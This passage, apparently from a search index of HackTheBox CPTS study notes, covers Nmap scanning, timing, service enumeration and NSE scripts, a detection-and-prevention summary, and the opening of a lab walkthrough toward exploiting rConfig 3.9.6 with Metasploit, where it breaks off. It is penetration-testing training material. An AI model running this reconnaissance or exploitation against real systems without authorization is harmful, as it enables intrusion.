with\u00a0<code>Nmap</code>. When setting the minimum rate (<code>--min-rate &lt;number&gt;</code>) for sending packets, we tell\u00a0<code>Nmap</code>\u00a0to simultaneously send the specified number of packets. It will attempt to maintain the rate accordingly.</p>"},{"location":"CPTS/Nmap/Performance/#default-scan_2","title":"Default Scan","text":"<p>Performance</p> <pre><code>0xs5@htb[/htb]$ sudo nmap 10.129.2.0/24 -F -oN tnet.default\n\n&lt;SNIP&gt;\nNmap done: 256 IP addresses (10 hosts up) scanned in 29.83 seconds\n</code></pre>"},{"location":"CPTS/Nmap/Performance/#optimized-scan","title":"Optimized Scan","text":"<p>Performance</p> <pre><code>0xs5@htb[/htb]$ sudo nmap 10.129.2.0/24 -F -oN tnet.minrate300 --min-rate 300\n\n&lt;SNIP&gt;\nNmap done: 256 IP addresses (10 hosts up) scanned in 8.67 seconds\n</code></pre> Scanning Options Description <code>10.129.2.0/24</code> Scans the specified target network. <code>-F</code> Scans top 100 ports. <code>-oNtnet.minrate300</code> Saves the results in normal formats, starting the specified file name. <code>--min-rate 300</code> Sets the minimum number of packets to be sent per second."},{"location":"CPTS/Nmap/Performance/#default-scan-found-open-ports","title":"Default Scan - Found Open Ports","text":"<p>Performance</p> <pre><code>0xs5@htb[/htb]$ cat tnet.default | grep \"/tcp\" | wc -l\n\n23\n</code></pre>"},{"location":"CPTS/Nmap/Performance/#optimized-scan-found-open-ports","title":"Optimized Scan - Found Open Ports","text":"<p>Performance</p> <pre><code>0xs5@htb[/htb]$ cat tnet.minrate300 | grep \"/tcp\" | wc -l\n\n23\n</code></pre>"},{"location":"CPTS/Nmap/Performance/#timing","title":"Timing","text":"<p>Because such settings cannot always be optimized manually, as in a black-box penetration test,\u00a0<code>Nmap</code>\u00a0offers six different timing templates (<code>-T &lt;0-5&gt;</code>) for us to use. These values (<code>0-5</code>) determine the aggressiveness of our scans. This can also have negative effects if the scan is too aggressive, and security systems may block us due to the produced network traffic. The default timing template used when we have defined nothing else is the normal (<code>-T 3</code>).</p> <ul> <li><code>-T 0</code>\u00a0/\u00a0<code>-T paranoid</code></li> <li><code>-T 1</code>\u00a0/\u00a0<code>-T sneaky</code></li> <li><code>-T 2</code>\u00a0/\u00a0<code>-T polite</code></li> <li><code>-T 3</code>\u00a0/\u00a0<code>-T normal</code></li> <li><code>-T 4</code>\u00a0/\u00a0<code>-T aggressive</code></li> <li><code>-T 5</code>\u00a0/\u00a0<code>-T insane</code></li> </ul> <p>These templates contain options that we can also set manually, and have seen some of them already. The developers determined the values set for these templates according to their best results, making it easier for us to adapt our scans to the corresponding network environment. The exact used options with their values we can find here:\u00a0https://nmap.org/book/performance-timing-templates.html</p>"},{"location":"CPTS/Nmap/Performance/#default-scan_3","title":"Default Scan","text":"<p>Performance</p> <pre><code>0xs5@htb[/htb]$ sudo nmap 10.129.2.0/24 -F -oN tnet.default \n\n&lt;SNIP&gt;\nNmap done: 256 IP addresses (10 hosts up) scanned in 32.44 seconds\n</code></pre>"},{"location":"CPTS/Nmap/Performance/#insane-scan","title":"Insane Scan","text":"<p>Performance</p> <pre><code>0xs5@htb[/htb]$ sudo nmap 10.129.2.0/24 -F -oN tnet.T5 -T 5\n\n&lt;SNIP&gt;\nNmap done: 256 IP addresses (10 hosts up) scanned in 18.07 seconds\n</code></pre> Scanning Options Description <code>10.129.2.0/24</code> Scans the specified target network. <code>-F</code> Scans top 100 ports. <code>-oN tnet.T5</code> Saves the results in normal formats, starting the specified file name. <code>-T 5</code> Specifies the insane timing template."},{"location":"CPTS/Nmap/Performance/#default-scan-found-open-ports_1","title":"Default Scan - Found Open Ports","text":"<p>Performance</p> <pre><code>0xs5@htb[/htb]$ cat tnet.default | grep \"/tcp\" | wc -l\n\n23\n</code></pre>"},{"location":"CPTS/Nmap/Performance/#insane-scan-found-open-ports","title":"Insane Scan - Found Open Ports","text":"<p>Performance</p> <pre><code>0xs5@htb[/htb]$ cat tnet.T5 | grep \"/tcp\" | wc -l\n\n23\n</code></pre> <p>More information about scan performance we can find at\u00a0https://nmap.org/book/man-performance.html</p> <p>Next [[Firewall and IDS IPS Evasion]]</p>"},{"location":"CPTS/Nmap/Saving%20the%20Result/","title":"Saving the Result","text":""},{"location":"CPTS/Nmap/Saving%20the%20Result/#references","title":"References","text":"<ul> <li>Example Tutorial</li> <li>OSCP Exploit Documentation</li> </ul> <p>Saving the Results:</p> <ul> <li>Importance: Always save results for later analysis and comparison between different scanning methods.</li> </ul> <p>Nmap Formats:</p> <ol> <li>Normal Output (-oN): Saves output with <code>.nmap</code> extension.</li> <li>Grepable Output (-oG): Saves output with <code>.gnmap</code> extension.</li> <li>XML Output (-oX): Saves output with <code>.xml</code> extension.</li> <li>All Formats (-oA): Saves in all formats at once.</li> </ol> <p>Example Command:</p> <pre><code>sudo nmap 10.129.2.28 -p- -oA target\n</code></pre> <ul> <li>Target IP: 10.129.2.28</li> <li>Ports Scanned: All (-p-)</li> <li>Output Files: <code>target.nmap</code>, <code>target.gnmap</code>, <code>target.xml</code></li> </ul> <p>Nmap Output Examples:</p> <ul> <li>Normal Output:</li> </ul> <pre><code>cat target.nmap\n</code></pre> <ul> <li>Grepable Output:</li> </ul> <p><pre><code>cat target.gnmap\n</code></pre> ![[Pasted image 20241023111452.png]]</p> <ul> <li>XML Output: <pre><code>cat target.xml\n</code></pre></li> </ul> <p>XML to HTML Conversion:</p> <ul> <li>Tool: <code>xsltproc</code></li> <li>Command:</li> </ul> <pre><code>xsltproc target.xml -o target.html\n</code></pre> <p>![[Pasted image 20241023111402.png]] - This generates a readable HTML report from the XML file, useful for documentation.</p> <p>Next [[Service Enumeration]]</p>"},{"location":"CPTS/Nmap/Service%20Enumeration/","title":"Service Enumeration","text":""},{"location":"CPTS/Nmap/Service%20Enumeration/#references","title":"References","text":"<ul> <li>Example Tutorial</li> <li>OSCP Exploit Documentation</li> </ul>"},{"location":"CPTS/Nmap/Service%20Enumeration/#service-enumeration","title":"Service Enumeration","text":"<p>Objective: The goal of service enumeration is to determine the services running on a target system and identify their versions. This information is crucial for finding potential vulnerabilities associated with the specific versions of the services. With accurate versioning, you can narrow down your search for exploits tailored to the target system.</p>"},{"location":"CPTS/Nmap/Service%20Enumeration/#service-version-detection","title":"Service Version Detection","text":"<p>Step 1: Initial Quick Scan Before performing an in-depth scan, it\u2019s beneficial to run a quick port scan to get a general overview of the open ports on the target. This generates less traffic and reduces the chance of triggering security mechanisms like Intrusion Detection Systems (IDS).</p> <p>Command:<code><pre><code>sudo nmap 10.129.2.28 -p- -sV\n</code></pre></code></p> <ul> <li><code>-p-</code>: Scans all 65535 ports.</li> <li><code>-sV</code>: Performs service version detection on the open ports.</li> </ul> <p>Nmap will return results displaying the open ports and the services running on them. This scan takes time, but it provides a full scope of what\u2019s running on the target.</p> <p>Example Output:</p> <pre><code>PORT     STATE    SERVICE     VERSION 22/tcp   open     ssh         OpenSSH 7.6p1 (Ubuntu) 25/tcp   open     smtp        Postfix smtpd 80/tcp open     http        Apache httpd 2.4.29 (Ubuntu) ...\n</code></pre>"},{"location":"CPTS/Nmap/Service%20Enumeration/#step-2-monitoring-the-scan-progress","title":"Step 2: Monitoring the Scan Progress","text":"<p>Nmap\u2019s full port scans can be time-consuming. To monitor the progress, you can press the space bar during the scan to display the current status. Alternatively, you can set a periodic progress update using the <code>--stats-every</code> option:</p> <p>Command:</p> <pre><code>sudo nmap 10.129.2.28 -p- -sV --stats-every=5s\n</code></pre> <ul> <li><code>--stats-every=5s</code>: Displays scan status every 5 seconds.</li> </ul> <p>Example Status Output:</p> <pre><code>Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 39.57% done; ETC: 19:48 (0:00:15 remaining)\n</code></pre>"},{"location":"CPTS/Nmap/Service%20Enumeration/#step-3-verbose-output-for-immediate-feedback","title":"Step 3: Verbose Output for Immediate Feedback","text":"<p>When working on a large network, it helps to increase Nmap's verbosity to view results as they are discovered. This is useful to observe the open ports immediately, without waiting for the entire scan to complete.</p> <p>Command:</p> <pre><code>sudo nmap 10.129.2.28 -p- -sV -v\n</code></pre> <ul> <li><code>-v</code>: Enables verbose mode.</li> </ul> <p>In this mode, Nmap displays each open port as it is detected, which allows you to analyze results in real-time and take action accordingly.</p>"},{"location":"CPTS/Nmap/Service%20Enumeration/#step-4-banner-grabbing","title":"Step 4: Banner Grabbing","text":"<p>Banner grabbing is essential to identify detailed information about the services running on a system. Some services reveal crucial details through banners sent during initial connections, such as software versions and underlying operating systems.</p> <p>Manual Banner Grabbing: You can manually connect to a specific service, such as an SMTP server, using <code>nc</code> (netcat) to retrieve the service banner:</p> <p>Command:</p> <p>bash</p> <p>Copy code</p> <pre><code>nc -nv 10.129.2.28 25\n</code></pre> <p>Example Output:</p> <pre><code>Connection to 10.129.2.28 port 25 [tcp/smtp] succeeded! 220 inlane ESMTP Postfix (Ubuntu)\n</code></pre>"},{"location":"CPTS/Nmap/Service%20Enumeration/#step-5-advanced-banner-analysis-with-tcpdump","title":"Step 5: Advanced Banner Analysis with Tcpdump","text":"<p>In certain cases, Nmap may not capture all service details. You can intercept network traffic using <code>tcpdump</code> to observe the raw packets exchanged during the service communication. This provides insight into the banners exchanged during connections.</p> <p>Command:</p> <pre><code>sudo tcpdump -i eth0 host 10.10.14.2 and 10.129.2.28\n</code></pre> <p>Tcpdump captures the network traffic between your machine and the target IP address. You can analyze the TCP flags and the service response to gather additional service details that Nmap might have missed.</p> <p>Example Tcpdump Output (Three-Way Handshake and Banner):</p> <pre><code>18:28:07.128564 IP 10.10.14.2.59618 &gt; 10.129.2.28.smtp: Flags [S], seq 1798872233, length 0 18:28:07.255151 IP 10.129.2.28.smtp &gt; 10.10.14.2.59618: Flags [S.], ack 1798872234, length 0 18:28:07.319306 IP 10.129.2.28.smtp &gt; 10.10.14.2.59618: Flags [P.], length 35: SMTP: 220 inlane ESMTP Postfix (Ubuntu)\n</code></pre> <p>Here, <code>tcpdump</code> reveals that the SMTP server is running on Ubuntu, a detail that Nmap might not always display.</p>"},{"location":"CPTS/Nmap/Service%20Enumeration/#step-6-comprehensive-scanning-options","title":"Step 6: Comprehensive Scanning Options","text":"<p>You can combine several advanced Nmap options to further customize the scan:</p> <p>Command:</p> <pre><code>sudo nmap 10.129.2.28 -p- -sV -Pn -n --disable-arp-ping --packet-trace\n</code></pre> <ul> <li><code>-Pn</code>: Disables ICMP Echo requests, assuming the host is up without pinging.</li> <li><code>-n</code>: Disables DNS resolution to speed up the scan.</li> <li><code>--disable-arp-ping</code>: Avoids ARP-based ping requests.</li> <li><code>--packet-trace</code>: Displays detailed packet-level interactions.</li> </ul>"},{"location":"CPTS/Nmap/Service%20Enumeration/#conclusion","title":"Conclusion","text":"<p>Service enumeration with Nmap is a critical phase in penetration testing. By identifying open ports and services running on a target, combined with banner grabbing and advanced packet analysis techniques, you can gain comprehensive insights into potential attack vectors. Each option in Nmap, such as verbosity, status checks, and manual verification tools like <code>nc</code> and <code>tcpdump</code>, helps refine your understanding of the target's network infrastructure, leading to more effective exploitation and vulnerability assessment.</p>"},{"location":"CPTS/Nmap/Service%20Enumeration/#tools-for-service-enumeration","title":"Tools for Service Enumeration:","text":"<ol> <li> <p>Nmap:</p> <ul> <li>Usage: The primary tool for port scanning and service version detection.</li> <li>Techniques:<ul> <li><code>-sV</code>: Service version detection.</li> <li><code>-p-</code>: Scan all 65535 ports.</li> <li><code>-v</code>: Verbose mode to display results in real-time.</li> <li><code>--stats-every</code>: Monitor scan progress periodically.</li> <li><code>-Pn</code>: Disable ping to skip host discovery.</li> <li><code>--packet-trace</code>: Track packet exchanges for deeper insights.</li> </ul> </li> <li> <p>Netcat (nc):</p> </li> <li> <p>Usage: Used for manual service probing (banner grabbing) by connecting to open ports and retrieving service banners.</p> </li> <li>Technique:<ul> <li>Manually connect to services (e.g., SSH, SMTP) using:     <code>nc -nv [IP] [PORT]</code></li> </ul> </li> </ul> </li> <li> <p>Tcpdump:</p> <ul> <li>Usage: Captures and analyzes network traffic to observe raw packets exchanged with services. Useful for manual banner grabbing and seeing network interactions.</li> <li>Technique:<ul> <li> <p>Capture traffic between your machine and the target using:</p> <p><code>sudo tcpdump -i [interface] host [target_ip]</code></p> </li> </ul> </li> </ul> </li> <li> <p>Wireshark:</p> <ul> <li>Usage: A network protocol analyzer used to capture and analyze network traffic, similar to <code>tcpdump</code> but with a graphical interface.</li> <li>Technique:<ul> <li>Capture traffic on your network interface and use filters (e.g., <code>tcp.port == 80</code>) to isolate relevant traffic.</li> </ul> </li> <li> <p>Telnet:</p> </li> <li> <p>Usage: Another tool for banner grabbing by manually connecting to services and observing responses.</p> </li> <li>Technique:<ul> <li> <p>Connect to specific services and see response:</p> <p><code>telnet [target_ip] [port]</code></p> </li> </ul> </li> </ul> </li> <li> <p>OpenSSL:</p> <ul> <li>Usage: Used for enumerating SSL/TLS-based services like HTTPS.</li> <li>Technique:<ul> <li>Gather SSL/TLS details of services:     <code>shellopenssl s_client -connect [target_ip]:[port]</code></li> </ul> </li> </ul> </li> <li> <p>Nikto:</p> <ul> <li>Usage: A web vulnerability scanner that helps in identifying software versions and possible security issues for web servers.</li> <li>Technique:<ul> <li> <p>Scan a web server for known vulnerabilities and version info:</p> <p><code>nikto -h [target_ip]</code></p> </li> </ul> </li> </ul> </li> </ol>"},{"location":"CPTS/Nmap/Service%20Enumeration/#techniques-for-service-enumeration","title":"Techniques for Service Enumeration:","text":"<ol> <li> <p>Port Scanning:</p> <ul> <li>Technique: Scans target machines to discover open ports. Used to find running services and their associated ports.</li> <li>Tool: Nmap (<code>-p-</code>, <code>-sV</code>).</li> <li> <p>Banner Grabbing:</p> </li> <li> <p>Technique: Manually retrieve service banners that often reveal software versions and other useful info.</p> </li> <li>Tools: Netcat, Telnet, Nmap.</li> <li> <p>Packet Analysis:</p> </li> <li> <p>Technique: Capture network traffic to observe service communication and grab service banners.</p> </li> <li>Tools: Tcpdump, Wireshark.</li> <li> <p>Service Fingerprinting:</p> </li> <li> <p>Technique: Identify the exact version of running services by sending crafted packets and analyzing the response.</p> </li> <li>Tool: Nmap (<code>-sV</code>), OpenSSL (for TLS).</li> <li> <p>DNS Enumeration:</p> </li> <li> <p>Technique: Enumerate domain names to discover hidden subdomains and services.</p> </li> <li>Tools: <code>dig</code>, <code>nslookup</code>, <code>dnsenum</code>.</li> <li> <p>Operating System Fingerprinting:</p> </li> <li> <p>Technique: Identify the operating system based on the responses of the services.</p> </li> <li>Tool: Nmap (<code>-O</code>).</li> <li>![[Pasted image 20241024002916.png]]</li> </ul> </li> </ol> <p>Next [[Nmap Scription Engine NSE]]</p>"},{"location":"CPTS/Nmap/nse/","title":"NSE","text":"<p>Overview: The Nmap Scripting Engine (NSE) allows users to create and run scripts in Lua to interact with various services during network scans. This powerful feature enhances Nmap\u2019s capabilities by providing automated checks and service interactions.</p>"},{"location":"CPTS/Nmap/nse/#script-categories","title":"Script Categories","text":"Category Description auth Determines authentication credentials. broadcast Used for host discovery by broadcasting; discovered hosts can be automatically added to subsequent scans. brute Attempts to log in to services through brute-forcing with credentials. default Executes default scripts when using the <code>-sC</code> option. discovery Evaluates accessible services. dos Checks services for denial-of-service vulnerabilities (used sparingly as it can harm services). exploit Attempts to exploit known vulnerabilities on scanned ports. external Uses external services for additional processing. fuzzer Identifies vulnerabilities and unexpected packet handling by sending varied packets (may take significant time). intrusive Scripts that could negatively impact the target system. malware Checks for malware infections on the target system. safe Defensive scripts that do not perform intrusive or destructive actions. version Extension for service detection. vuln Identifies specific vulnerabilities."},{"location":"CPTS/Nmap/nse/#running-nse-scripts","title":"Running NSE Scripts","text":"<p>1. Default Scripts Use the command below to run Nmap with default scripts:</p> <pre><code>    sudo nmap &lt;target&gt; -sC\n    ```\n\n**2. Specific Script Category**  \nRun a specific category of scripts with the command:\n\n```bash\n    sudo nmap &lt;target&gt; --script &lt;category&gt;\n    ```\n\n**3. Defined Scripts**  \nTo specify particular scripts, use the command:\n\n    ```bash\n    sudo nmap &lt;target&gt; --script &lt;script-name&gt;,&lt;script-name&gt;\n    ```\n\n### Example: Specifying Scripts\n\nTo run specific scripts on the SMTP port, use:\n\n```bash\n    sudo nmap 10.129.2.28 -p 25 --script banner,smtp-commands\n    ```\n#### Sample Output\n\n```ruby\n`Nmap scan report for 10.129.2.28 Host is up (0.050s latency). PORT   STATE SERVICE 25/tcp open  smtp |_banner: 220 inlane ESMTP Postfix (Ubuntu) |_smtp-commands: inlane, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, MAC Address: DE:AD:00:00:BE:EF (Intel Corporate)\n</code></pre>"},{"location":"CPTS/Nmap/nse/#aggressive-scan","title":"Aggressive Scan","text":"<p>To conduct an aggressive scan with multiple options:</p> <pre><code>    sudo nmap 10.129.2.28 -p 80 -A\n</code></pre>"},{"location":"CPTS/Nmap/nse/#sample-output","title":"Sample Output","text":"<p>makefile <pre><code>    Nmap scan report for 10.129.2.28 Host is up (0.012s latency). PORT   STATE SERVICE VERSION 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu)) |_http-generator: WordPress 5.3.4 |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: blog.inlanefreight.com\n</code></pre></p>"},{"location":"CPTS/Nmap/nse/#vulnerability-assessment","title":"Vulnerability Assessment","text":"<p>To scan for vulnerabilities on HTTP port 80 using NSE's vuln category:</p> <p><code>shell     sudo nmap 10.129.2.28 -p 80 -sV --script vuln</code></p>"},{"location":"CPTS/Nmap/nse/#sample-output_1","title":"Sample Output","text":"<p><code>ruby      Nmap scan report for 10.129.2.28 PORT   STATE SERVICE VERSION 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu)) | http-enum: |   /wp-login.php: Possible admin folder |   /readme.html: WordPress version: 2 |   /: WordPress version: 5.3.4 |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-wordpress-users: | Username found: admin</code></p>"},{"location":"CPTS/Nmap/nse/#additional-resources","title":"Additional Resources","text":"<p>For more information on NSE scripts and categories, visit: Nmap NSE Documentation</p> <p>Next [[Performance]]</p>"},{"location":"CPTS/Shells%20and%20Payloads/CAT5/","title":"CAT5 Security's Engagement Preparation","text":"<p>We are a penetration tester working for CAT5 Security, and we are preparing to perform an engagement for our client, Inlanefreight. The more senior team members at CAT5 want to see our skills with shells &amp; payloads before including us in the live engagement.</p> <p>The final assessment for this module is a series of challenges CAT5 Security created to test our skills. Completing the challenge means you have passed the evaluation.</p>"},{"location":"CPTS/Shells%20and%20Payloads/CAT5/#shell-basics","title":"Shell basics","text":"<ul> <li>Replicate being able to get a bind and reverse shell.</li> <li>Bind Shell on Linux host.</li> <li>Reverse Shell on Windows Host.</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/CAT5/#payload-basics","title":"Payload Basics","text":"<ul> <li>Demonstrate launching a payload from MSF.</li> <li>Demonstrate searching and building a payload from PoC on ExploitDB.</li> <li>Demonstrate knowledge of payload creation.</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/CAT5/#getting-a-shell-on-windows","title":"Getting a Shell on Windows","text":"<ul> <li>Using the recon results provided, craft or use a payload that will exploit the host and provide a shell back.</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/CAT5/#getting-a-shell-on-linux","title":"Getting a Shell on Linux","text":"<ul> <li>Using the recon results provided, craft or use a payload to exploit the host and establish a shell session.</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/CAT5/#landing-a-web-shell","title":"Landing a Web Shell","text":"<ul> <li>Demonstrate knowledge of web shells and common web applications by identifying a common web application and its corresponding language.</li> <li>Using the recon results provided, deploy a payload that will provide shell access from your browser.</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/CAT5/#spotting-a-shell-or-payload","title":"Spotting a Shell or Payload","text":"<ul> <li>Detect the presence of a payload or interactive shell on a host by analyzing relevant information provided.</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/CAT5/#final-challenge","title":"Final Challenge","text":"<ul> <li>Utilize knowledge gained from the previous sections to select, craft, and deploy a payload to access the provided hosts. Once a shell has been acquired, grab the requested information to answer the challenge questions.</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/DetectionAndPrevention/","title":"Detection &amp; Prevention Summary","text":"<ul> <li>Focus Areas: Detect active shells, payloads, and network activity to identify and respond to attacks.</li> <li>MITRE ATT&amp;CK Framework: Defines tactics attackers use. Key techniques include:<ul> <li>Initial Access: Gaining a foothold via web apps, misconfigured services, or vulnerabilities.</li> <li>Execution: Running attacker-supplied code using methods like PowerShell, exploits, or file uploads.</li> <li>Command &amp; Control (C2): Maintaining access using standard ports/protocols (e.g., HTTP, DNS) or obfuscated methods.</li> </ul> </li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/DetectionAndPrevention/#key-detection-points","title":"Key Detection Points","text":"<ul> <li>File Uploads: Monitor logs for unusual uploads, especially to web applications.</li> <li>Suspicious User Actions: Watch for unexpected commands (e.g., whoami) or irregular SMB usage.</li> <li>Anomalous Network Traffic: Track unusual patterns, nonstandard ports (e.g., 4444), or spikes in GET/POST requests.</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/DetectionAndPrevention/#enhancing-network-visibility","title":"Enhancing Network Visibility","text":"<ul> <li>Documentation &amp; Visualization: Maintain detailed network diagrams and use tools like Draw.io or NetBrain for interactive topology mapping.</li> <li>Layer 7 Visibility: Use modern network devices with traffic baselines, dashboards, and cloud controllers (e.g., Cisco Meraki, Palo Alto).</li> <li>Deep Packet Inspection (DPI): Inspect network traffic to detect and block unencrypted malicious payloads like Netcat-based traffic.</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/DetectionAndPrevention/#best-practices","title":"Best Practices","text":"<ul> <li>Establish baselines for normal activity.</li> <li>React quickly to deviations to minimize damage.</li> <li>Use network security appliances and monitoring tools (e.g., SIEMs, NetFlow).</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/DetectionAndPrevention/#protecting-end-devices","title":"Protecting End Devices","text":"<p>End devices are the devices that connect at the \"end\" of a network. This means they are either the source or destination of data transmission. Some examples of end devices would be:</p> <ul> <li>Workstations (employees computers)</li> <li>Servers (providing various services on the network)</li> <li>Printers</li> <li>Network Attached Storage (NAS)</li> <li>Cameras</li> <li>Smart TVs</li> <li>Smart Speakers</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/DetectionAndPrevention/#potential-mitigations-summary","title":"Potential Mitigations Summary","text":"<ul> <li> <p>Application Sandboxing: Isolate applications exposed to the internet to limit the impact of vulnerabilities or misconfigurations.</p> </li> <li> <p>Least Privilege Policies: Restrict user permissions to the minimum required for their roles. Prevent unnecessary administrative or domain-level access.</p> </li> <li> <p>Host Segmentation &amp; Hardening:</p> <ul> <li>Harden systems using standards like STIG guidelines.</li> <li>Segregate internet-facing systems (e.g., web or VPN servers) into a DMZ to prevent lateral movement in the network.</li> </ul> </li> <li> <p>Firewalls:</p> <ul> <li>Use physical and application-layer firewalls to enforce strict traffic rules.</li> <li>Allow only necessary traffic and block unauthorized inbound/outbound connections.</li> <li>Employ NAT to disrupt malicious shell payload functionality.</li> </ul> </li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/DetectionAndPrevention/#conclusion","title":"Conclusion","text":"<p>This module covered the basics of shells &amp; payloads, ways to transfer &amp; execute payloads to gain a shell on Windows &amp; Linux systems. It introduced detection &amp; prevention methods that can be implemented in any network environment.</p>"},{"location":"CPTS/Shells%20and%20Payloads/DetectionAndPrevention/#module-key-takeaways","title":"Module Key Takeaways","text":"<ul> <li>Established an understanding of the difference between\u00a0<code>Bind</code>\u00a0&amp;\u00a0<code>Reverse</code>\u00a0shells</li> <li>Experimented with common\u00a0<code>one-liners</code>\u00a0and studied them at a detailed level</li> <li>Used\u00a0<code>Metasploit</code>\u00a0to deploy a\u00a0<code>payload</code>\u00a0and establish a shell session</li> <li>Used\u00a0<code>MSFvenom</code>\u00a0to craft a payload</li> <li>Identified various methods of\u00a0<code>spawning interactive shells</code></li> <li>Experimented with various methods of gaining\u00a0<code>web</code>\u00a0shell sessions on web servers</li> <li>Applied an\u00a0<code>enumeration methodology</code>\u00a0to identify payloads &amp; shells that would be useful in different situations</li> <li>Explored\u00a0<code>detection</code>\u00a0and\u00a0<code>prevention</code>\u00a0techniques</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/Infiltrating-Unix-Linux/","title":"Infiltrating Unix Linux","text":""},{"location":"CPTS/Shells%20and%20Payloads/Infiltrating-Unix-Linux/#infiltrating-unixlinux","title":"Infiltrating Unix/Linux","text":""},{"location":"CPTS/Shells%20and%20Payloads/Infiltrating-Unix-Linux/#unixlinux-usage-and-pivoting-in-environments","title":"Unix/Linux Usage and Pivoting in Environments","text":"<ol> <li> <p>Unix/Linux Dominance:</p> <ul> <li>Over 70% of websites run on Unix-based systems.</li> <li>Knowledge of Unix/Linux is critical for web server exploitation and pivoting.</li> <li> <p>Third-Party Hosting vs. On-Premises:</p> </li> <li> <p>Many organizations use 3rd parties or cloud providers for hosting.</p> </li> <li>However, some still host websites/web apps on-premises, providing an opportunity to gain deeper access.</li> <li> <p>Pivoting Strategy:</p> </li> <li> <p>Establish a shell session on the target Unix/Linux server.</p> </li> <li>Use this access to enumerate the internal network and pivot to other systems.</li> <li> <p>Key Skills to Focus On:</p> </li> <li> <p>Shell exploitation on Unix/Linux systems.</p> </li> <li>Post-exploitation techniques for network pivoting.</li> <li>Identifying and leveraging on-premise hosting environments.</li> </ul> </li> </ol>"},{"location":"CPTS/Shells%20and%20Payloads/Infiltrating-Unix-Linux/#common-considerations","title":"Common Considerations","text":"<ul> <li>What distribution of Linux is the system running?</li> <li>What shell &amp; programming languages exist on the system?</li> <li>What function is the system serving for the network environment it is on?</li> <li>What application is the system hosting?</li> <li>Are there any known vulnerabilities?</li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/Infiltrating-Unix-Linux/#gaining-a-shell-through-attacking-a-vulnerable-application","title":"Gaining a Shell Through Attacking a Vulnerable Application","text":"<p>As in most engagements, we will start with an initial enumeration of the system using [Nmap].</p>"},{"location":"CPTS/Shells%20and%20Payloads/Infiltrating-Unix-Linux/#enumerate-the-host","title":"Enumerate the Host","text":"<p><pre><code>nmap -sC -sV $ip\n-----------------\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 09:09 EDT\nNmap scan report for 10.129.201.101\nHost is up (0.11s latency).\nNot shown: 994 closed ports\nPORT     STATE SERVICE  VERSION\n21/tcp   open  ftp      vsftpd 2.0.8 or later\n22/tcp   open  ssh      OpenSSH 7.4 (protocol 2.0)\n| ssh-hostkey: \n|   2048 2d:b2:23:75:87:57:b9:d2:dc:88:b9:f4:c1:9e:36:2a (RSA)\n|   256 c4:88:20:b0:22:2b:66:d0:8e:9d:2f:e5:dd:32:71:b1 (ECDSA)\n|_  256 e3:2a:ec:f0:e4:12:fc:da:cf:76:d5:43:17:30:23:27 (ED25519)\n80/tcp   open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)\n|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34\n|_http-title: Did not follow redirect to https://10.129.201.101/\n111/tcp  open  rpcbind  2-4 (RPC #100000)\n| rpcinfo: \n|   program version    port/proto  service\n|   100000  2,3,4        111/tcp   rpcbind\n|   100000  2,3,4        111/udp   rpcbind\n|   100000  3,4          111/tcp6  rpcbind\n|_  100000  3,4          111/udp6  rpcbind\n443/tcp  open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)\n|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34\n|_http-title: Site doesn't have a title (text/html; charset=UTF-8).\n| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--\n| Not valid before: 2021-09-24T19:29:26\n|_Not valid after:  2022-09-24T19:29:26\n|_ssl-date: TLS randomness does not represent time\n3306/tcp open  mysql    MySQL (unauthorized)\n</code></pre> Keeping our goal of gaining a shell session in mind, we must establish some next steps after examining our scan output.</p> <p>What information could we gather from the output?</p> <p>Considering we can see the system is listening on ports <code>80 (HTTP)</code>, <code>443 (HTTPS)</code>, <code>3306 (MySQL)</code>, and <code>21 (FTP)</code>, it may be safe to assume that this is a web server hosting a web application. We can also see some version numbers revealed associated with the web stack (<code>Apache 2.4.6 and PHP 7.2.34</code> ) and the distribution of Linux running on the system (<code>CentOS</code>). Before deciding on a direction to research further (dive down a rabbit hole), we should also try navigating to the IP address through a web browser to discover the hosted application if possible. Here we discover a network configuration management tool called <code>rConfig</code>. This application is used by network &amp; system administrators to automate the process of configuring network appliances. </p>"},{"location":"CPTS/Shells%20and%20Payloads/Infiltrating-Unix-Linux/#discovering-a-vulnerability-in-rconfig","title":"Discovering a Vulnerability in rConfig","text":"<p>Take a close look at the bottom of the web login page, and we can see the <code>rConfig</code> version number (<code>3.9.6</code>). We should use this information to start looking for any CVEs, publicly available exploits, and proof of concepts (PoCs). As we research, be sure to look closely at what we find and understand what it is doing. We, of course, want it to lead us to a shell session with the target.</p> <p>Using your search engine of choice will turn up some promising results. We can use the keywords: <code>rConfig 3.9.6</code> vulnerability.</p>"},{"location":"CPTS/Shells%20and%20Payloads/Infiltrating-Unix-Linux/#search-for-an-exploit-module","title":"Search For an Exploit Module","text":"<p><pre><code>msf6 &gt; search rconfig\n\nMatching Modules\n================\n\n#Name                                             Disclosure Date  Rank       Check  Description\n-  ----                                             ---------------  ----       -----  -----------\n0  